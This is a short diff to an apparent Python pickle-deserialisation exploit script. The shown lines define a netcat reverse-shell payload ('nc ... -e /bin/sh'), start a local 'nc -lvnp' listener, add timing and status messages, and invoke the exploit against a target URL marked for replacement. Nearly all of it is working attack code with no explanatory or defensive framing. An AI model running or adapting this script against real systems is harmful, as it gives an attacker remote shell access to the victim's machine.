@@ -3,6 +3,7 @@ import base64
 import pickle
 import os
 import requests
+import time 
 
 # Payload to be executed (nc reverse shell payload)
 payload = "nc -v 127.0.0.1 1234 -e /bin/sh"
@@ -33,6 +34,10 @@ if __name__ == "__main__":
     # Example usage
     target_url = "http://127.0.0.1:1234"  # Replace with the actual target URL
 
+print(f'[*]' ' Starting listener')
 os.system("nc -lvnp 1234")
 
+time.sleep(2)
+
+print(f'[*]' ' Executing program: Pickle Rick..')
 exploit(target_url)
